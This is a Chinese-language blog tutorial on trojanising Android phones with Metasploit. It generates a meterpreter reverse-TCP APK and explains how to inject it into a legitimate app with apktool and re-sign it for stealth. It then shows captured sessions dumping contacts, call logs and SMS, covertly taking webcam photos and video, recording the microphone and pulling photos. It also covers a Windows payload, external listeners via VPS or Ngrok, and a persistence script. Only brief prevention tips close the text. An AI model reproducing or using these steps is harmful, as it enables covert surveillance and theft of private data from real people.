### 安装msf

是什么？Metasploit Framework

什么是Metasploit？

简单来说：全球最常用的渗透测试框架，ruby语言写的

Metasploit是一款开源的安全漏洞检测工具，可以帮助安全和IT专业人士识别安全性问题，验证漏洞的缓解措施，并管理专家驱动的安全性进行评估，提供真正的安全风险情报。

**验证漏洞开源的工具**

官网：https://www.metasploit.com/

github:https://github.com/rapid7/metasploit-framework/wiki/Nightly-Installers

如果是mac环境，直接在命令行中输入

```
curl https://raw.githubusercontent.com/rapid7/metasploit-omnibus/master/config/templates/metasploit-framework-wrappers/msfupdate.erb > msfinstall && \
  chmod 755 msfinstall && \
  ./msfinstall
```
等待结果是

```
# laibinzhi @ laibinzhideMacBook-Pro in ~ [19:13:23]
$ curl https://raw.githubusercontent.com/rapid7/metasploit-omnibus/master/config/templates/metasploit-framework-wrappers/msfupdate.erb > msfinstall && \
  chmod 755 msfinstall && \
  ./msfinstall
  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current
                                 Dload  Upload   Total   Spent    Left  Speed
100  5922  100  5922    0     0  11939      0 --:--:-- --:--:-- --:--:-- 11915
Switching to root user to update the package
Password:
Downloading package...
  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current
                                 Dload  Upload   Total   Spent    Left  Speed
 58  207M   58  120M    0     0  3225k      0  0:01:05  0:00:38  0:00:27 3468k
curl: (18) transfer closed with 90925034 bytes remaining to read
Checking signature...
Package "metasploitframework-latest.pkg":
   Status: package is invalid (checksum did not verify)
Cleaning up...
metasploitframework-latest.pkg
```

在zsh配置文件下配置msf路径的环境变量，方便直接调用msf路径


```
vim ~/.zshrc
export PATH="$PATH:/opt/metasploit-framework/bin"
```

### 启用msf


```
$ msfconsole
```

如果是第一次使用，在输入上面命令的时候，会提示初始化一个数据库，选择y

```
Would you like to use and setup a new database (recommended)? y
```
然后设置用户名和密码，这里都设置为msf

```
[?] Initial MSF web service account username? [opposec]: msf
[?] Initial MSF web service account password? (Leave blank for random password): msf
```
然后提示创建成功

在浏览器打开 https://localhost:5443/api/v1/auth/account

![image](http://lbz-blog.test.upcdn.net/post/%E6%88%AA%E5%B1%8F2020-09-17%E4%B8%8B%E5%8D%887.25.27.png)

输入刚刚的用户名密码，登录进去。


### 制作木马程序
使用msfvenom工具来创建有效载荷APK文件（木马）

```
$ msfvenom -p android/meterpreter/reverse_tcp LHOST=10.0.0.101 LPORT=5555 R > /Users/laibinzhi/temp/msf/mua.apk
[-] No platform was selected, choosing Msf::Module::Platform::Android from the payload
[-] No arch selected, selecting arch: dalvik from the payload
No encoder specified, outputting raw payload
Payload size: 10179 bytes
```

注意：
- 10.0.0.101 是电脑的ip地址，可以通过下面命令行获取
```
ifconfig | grep "inet"
```

![image](http://lbz-blog.test.upcdn.net/post/木马-获取ip地址)

- 端口号5555，使用这个就好
- 后面输出的是apk后缀的木马文件

### 安装木马程序

本例子使用最简单的方式安装到手机上，安装成功后，他出现在桌面上，只有一个图标。如果是常见的就是把它反编译，把它注入到现有app中，这样就比较隐秘。

### 反编译注入


1. 反编译
```
apktool d normal.apk
apktool d mua.apk
```

2. 在目标MainActivityOnCreate插入
```
invoke-static {p0}, Lcom/metasploit/stage/Payload;->start(Landroid/content/Context;)V

```

3. 将木马mua文件夹中的metasploit整个目录放到目标文件下com下

4. 把木马AndroidManifest文件的所有权限复制到目标的AndroidManifest中

5. 重新构建apk

```
apktool b normal -o new.apk
```

6.签名

```
jarsigner -verbose -keystore ~/.android/debug.keystore -storepass android -keypass android -digestalg SHA1 -sigalg MD5withRSA  new.apk  androiddebugkey
```


### 监听手机

以此输入下列命令，比较注意的是这些参数的值跟之前msfvenom使用的参数一样。url和端口号

```
//加载模块
use exploit/multi/handler 
//选择Payload
set payload android/meterpreter/reverse_tcp 
//查看参数设置
show options 
set LHOST 10.0.0.101
set LPORT 5555
show options 

```
![image](http://lbz-blog.test.upcdn.net/post/%E6%9C%A8%E9%A9%AC-%E8%BE%93%E5%85%A5%E5%8F%82%E6%95%B0.png)

最后执行下面命令正在监听
```
exploit
```

```
msf6 exploit(multi/handler) > exploit

[*] Started reverse TCP handler on 10.0.0.101:5555

```
这里表示一致在监听，如果现在用户点击了那个木马程序，那么就会建立一个meterpreter连接。

```
msf6 exploit(multi/handler) > exploit

[*] Started reverse TCP handler on 10.0.0.101:5555
[*] Sending stage (76767 bytes) to 10.0.0.15
[*] Meterpreter session 1 opened (10.0.0.101:5555 -> 10.0.0.15:44292) at 2020-09-17 19:47:25 +0800

meterpreter >
```

建立连接之后，我们就可以实现电脑控制手机了,下面就是一些常见的命令行


```
meterpreter > help

Core Commands
=============

    Command                   Description
    -------                   -----------
    ?                         Help menu
    background                Backgrounds the current session
    bg                        Alias for background
    bgkill                    Kills a background meterpreter script
    bglist                    Lists running background scripts
    bgrun                     Executes a meterpreter script as a background thread
    channel                   Displays information or control active channels
    close                     Closes a channel
    disable_unicode_encoding  Disables encoding of unicode strings
    enable_unicode_encoding   Enables encoding of unicode strings
    exit                      Terminate the meterpreter session
    get_timeouts              Get the current session timeout values
    guid                      Get the session GUID
    help                      Help menu
    info                      Displays information about a Post module
    irb                       Open an interactive Ruby shell on the current session
    load                      Load one or more meterpreter extensions
    machine_id                Get the MSF ID of the machine attached to the session
    pry                       Open the Pry debugger on the current session
    quit                      Terminate the meterpreter session
    read                      Reads data from a channel
    resource                  Run the commands stored in a file
    run                       Executes a meterpreter script or Post module
    secure                    (Re)Negotiate TLV packet encryption on the session
    sessions                  Quickly switch to another session
    set_timeouts              Set the current session timeout values
    sleep                     Force Meterpreter to go quiet, then re-establish session.
    transport                 Change the current transport mechanism
    use                       Deprecated alias for "load"
    uuid                      Get the UUID for the current session
    write                     Writes data to a channel


Stdapi: File system Commands
============================

    Command       Description
    -------       -----------
    cat           Read the contents of a file to the screen
    cd            Change directory
    checksum      Retrieve the checksum of a file
    cp            Copy source to destination
    del           Delete the specified file
    dir           List files (alias for ls)
    download      Download a file or directory
    edit          Edit a file
    getlwd        Print local working directory
    getwd         Print working directory
    lcd           Change local working directory
    lls           List local files
    lpwd          Print local working directory
    ls            List files
    mkdir         Make directory
    mv            Move source to destination
    pwd           Print working directory
    rm            Delete the specified file
    rmdir         Remove directory
    search        Search for files
    upload        Upload a file or directory


Stdapi: Networking Commands
===========================

    Command       Description
    -------       -----------
    ifconfig      Display interfaces
    ipconfig      Display interfaces
    portfwd       Forward a local port to a remote service
    route         View and modify the routing table


Stdapi: System Commands
=======================

    Command       Description
    -------       -----------
    execute       Execute a command
    getuid        Get the user that the server is running as
    localtime     Displays the target system local date and time
    pgrep         Filter processes by name
    ps            List running processes
    shell         Drop into a system command shell
    sysinfo       Gets information about the remote system, such as OS


Stdapi: User interface Commands
===============================

    Command       Description
    -------       -----------
    screenshare   Watch the remote user desktop in real time
    screenshot    Grab a screenshot of the interactive desktop


Stdapi: Webcam Commands
=======================

    Command        Description
    -------        -----------
    record_mic     Record audio from the default microphone for X seconds
    webcam_chat    Start a video chat
    webcam_list    List webcams
    webcam_snap    Take a snapshot from the specified webcam
    webcam_stream  Play a video stream from the specified webcam


Stdapi: Audio Output Commands
=============================

    Command       Description
    -------       -----------
    play          play a waveform audio file (.wav) on the target system


Android Commands
================

    Command           Description
    -------           -----------
    activity_start    Start an Android activity from a Uri string
    check_root        Check if device is rooted
    dump_calllog      Get call log
    dump_contacts     Get contacts list
    dump_sms          Get sms messages
    geolocate         Get current lat-long using geolocation
    hide_app_icon     Hide the app icon from the launcher
    interval_collect  Manage interval collection capabilities
    send_sms          Sends SMS from target session
    set_audio_mode    Set Ringer Mode
    sqlite_query      Query a SQLite database from storage
    wakelock          Enable/Disable Wakelock
    wlan_geolocate    Get current lat-long using WLAN information


Application Controller Commands
===============================

    Command        Description
    -------        -----------
    app_install    Request to install apk file
    app_list       List installed apps in the device
    app_run        Start Main Activty for package name
    app_uninstall  Request to uninstall application

meterpreter >
```



### 体验

##### 获取手机通讯录


```
meterpreter > dump_contacts
[*] Fetching 2 contacts into list
[*] Contacts list saved to: contacts_dump_20200917195142.txt
meterpreter >
```
在电脑目录多了一个contacts_dump_20200917195142.txt的文件，打开如图所示
![image](http://lbz-blog.test.upcdn.net/post/%E6%9C%A8%E9%A9%AC-%E9%80%9A%E8%AE%AF%E5%BD%95)


##### 获取手机通话记录

```
meterpreter > dump_calllog
[*] Fetching 9 entries
[*] Call log saved to calllog_dump_20200917195408.txt
meterpreter >
```
在电脑目录多了一个calllog_dump_20200917195408.txt的文件，打开如图所示
![image](http://lbz-blog.test.upcdn.net/post/%E6%9C%A8%E9%A9%AC-%E8%81%8A%E5%A4%A9%E8%AE%B0%E5%BD%95)


##### 获取手机短信

```
meterpreter > dump_sms
[*] Fetching 6 sms messages
[*] SMS messages saved to: sms_dump_20200917195455.txt
meterpreter >
```
在电脑目录多了一个sms_dump_20200917195455.txt的文件，打开如图所示
![image](http://lbz-blog.test.upcdn.net/post/%E6%9C%A8%E9%A9%AC-%E7%9F%AD%E4%BF%A1.png)


##### 拍照

获取摄像头列表

```
meterpreter > webcam_list
1: Back Camera
2: Front Camera
meterpreter >
```
表示有两个摄像头，前置和后置，如果想要用前置摄像头拍

```
meterpreter > webcam_snap -i 2
[*] Starting...
[+] Got frame
[*] Stopped
Webcam shot saved to: /Users/laibinzhi/VEduPltE.jpeg
meterpreter >
```
在电脑目录多了一个VEduPltE.jpeg的图片，打开如图所示
![image](http://lbz-blog.test.upcdn.net/post/%E6%9C%A8%E9%A9%AC-%E5%81%B7%E6%8B%8D.jpeg)

同样的，后置摄像头就把2改为1

##### 录像

支持实时的一帧帧的照片组成的视频,下面是一些配置参数


```

OPTIONS:

    -d <opt>  The stream duration in seconds (Default: 1800)
    -h        Help Banner
    -i <opt>  The index of the webcam to use (Default: 1)
    -q <opt>  The stream quality (Default: '50')
    -s <opt>  The stream file path (Default: 'znKDlLHK.jpeg')
    -t <opt>  The stream player path (Default: AXrBlNIK.html)
    -v <opt>  Automatically view the stream (Default: 'true')


```

```
meterpreter > webcam_stream -d 3000 -i 2
[*] Starting...
[*] Preparing player...
[*] Opening player at: /Users/laibinzhi/BXVgcrka.html
[*] Streaming...
```
在电脑浏览器打开一个网页显示，如图
![image](http://lbz-blog.test.upcdn.net/post/%E6%9C%A8%E9%A9%AC-%E6%91%84%E5%83%8F.png)

##### 窃听

```
meterpreter > record_mic -d 10
[*] Starting...
[*] Stopped
Audio saved to: /Users/laibinzhi/jRKKqgWB.wav
```

同样在电脑桌面多了一个wav音频文件，为10秒钟的窃听数据。

##### 文件的上传和下载


```
meterpreter > search -d /storage/emulated/0/DCIM/Camera -f *.jpg
Found 7 results...
    /storage/emulated/0/DCIM/Camera/IMG_20191031_160023.jpg (5423142 bytes)
    /storage/emulated/0/DCIM/Camera/IMG_20191118_185509.jpg (5949546 bytes)
    /storage/emulated/0/DCIM/Camera/IMG_20191118_185524.jpg (5735779 bytes)
    /storage/emulated/0/DCIM/Camera/IMG_20200917_102718.jpg (8895869 bytes)
    /storage/emulated/0/DCIM/Camera/IMG_20200917_105937.jpg (4652128 bytes)
    /storage/emulated/0/DCIM/Camera/IMG_20200917_105941.jpg (4666146 bytes)
    /storage/emulated/0/DCIM/Camera/IMG_20200917_111307.jpg (4892873 bytes)
meterpreter >
```

通过search命令，获取手机的内容，比如图片
再通过download和upload命令，可以把手机上面的照片下载

### windows?

```
msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.0.0.101  LPORT=5555 x > /Users/laibinzhi/Downloads/mua.exe
```

### 怎么外网访问监听？

1.使用vps转发来达到上线目的。

2.使用Ngrok等工具做内网穿透。

### 掉线问题

自写守护脚本，用shell运行。

```
# !/bin/bash
while:
do am start --user 0 -a com.intent.MAIN -n com.lbz.testmsfdemo/.MainActivity
sleep 30
done
```


### 预防

1. 请勿随意连上陌生wifi
2. 下载应用程序要在官方渠道下载
3. 手机不要root
4. 手机app授权要谨慎
5. 打包应用程序的时候安装包加固以免被不法分子反编译